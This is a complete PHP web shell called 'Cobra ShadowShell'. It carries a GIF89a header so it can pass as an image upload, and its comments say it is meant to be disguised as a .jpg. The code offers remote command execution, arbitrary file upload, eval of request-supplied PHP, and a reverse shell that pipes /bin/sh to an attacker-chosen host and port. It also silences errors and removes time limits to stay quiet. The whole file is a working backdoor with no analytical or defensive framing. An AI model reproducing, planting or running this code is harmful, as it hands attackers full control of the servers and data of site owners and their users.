GIF89a;
<?php
/*
 * Cobra ShadowShell 🐍
 * RCE + File Upload + Eval + Reverse Shell
 * Stealth polyglot: works as .php OR disguised as .jpg/.jgg
 */

@error_reporting(0);
@set_time_limit(0);

// ---------- 1. Remote Command Execution ----------
if (isset($_REQUEST['cmd'])) {
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}

// ---------- 2. File Upload ----------
if (isset($_FILES['file'])) {
    $target = basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        echo "Uploaded: $target";
    } else {
        echo "Upload failed.";
    }
}

// ---------- 3. Eval Arbitrary PHP Code ----------
if (isset($_REQUEST['eval'])) {
    eval($_REQUEST['eval']);
}

// ---------- 4. Reverse Shell (optional trigger) ----------
if (isset($_REQUEST['rev'])) {
    $ip = $_REQUEST['ip'] ?? "127.0.0.1";   // change default if needed
    $port = $_REQUEST['port'] ?? "4444";

    $sock = fsockopen($ip, $port);
    if ($sock) {
        $proc = proc_open("/bin/sh -i", [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"]
        ], $pipes);

        if (is_resource($proc)) {
            stream_copy_to_stream($pipes[1], $sock);
            stream_copy_to_stream($sock, $pipes[0]);
        }
    }
}
?>
